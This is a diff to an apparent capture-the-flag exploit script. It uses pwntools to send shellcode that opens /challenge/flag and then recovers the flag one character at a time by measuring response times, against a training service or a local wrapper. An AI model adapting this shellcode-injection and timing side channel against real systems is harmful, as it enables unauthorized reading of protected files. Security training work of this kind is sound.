@@ -6,6 +6,17 @@ from pwn import *
 context.arch = 'amd64'
 context.log_level = 'info'
 
+def get_timing(p):
+    """Extract timing from process using recvuntil/recvline"""
+    try:
+        # Wait for "Time: " and get the number
+        p.recvuntil(b"Time: ")
+        timing_str = p.recvline().decode().strip()
+        return float(timing_str)
+    except Exception as e:
+        log.warning(f"Failed to get timing: {e}")
+        return 0.0
+
 def create_timing_shellcode(position, character):
     shellcode = asm(f'''
         /* Open /challenge/flag */
@@ -66,12 +77,19 @@ def brute_force_flag():
                     p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
                 else:
                     p = process(['python3', 'wrapper.py'], env=env)
-                shellcode = create_timing_shellcode(position, ord(character))
-                p.send(shellcode)
-                output = p.recvall()
 
-                time_str = output.split("Time: ")[1].strip()
-                time_val = float(time_str)
+                # Wait for prompt
+                p.recvuntil(b"Shellcode: ")
+
+                shellcode = create_timing_shellcode(position, ord(character))
+                
+                p.send(shellcode)
+                time_val = get_timing(p)
+                p.close()
+                #output = p.recvall()
+
+                #time_str = output.split("Time: ")[1].strip()
+                #time_val = float(time_str)
                 log.info(f"Char '{character}': {time_val:.3f}s")
 
                 if time_val > 0.05:
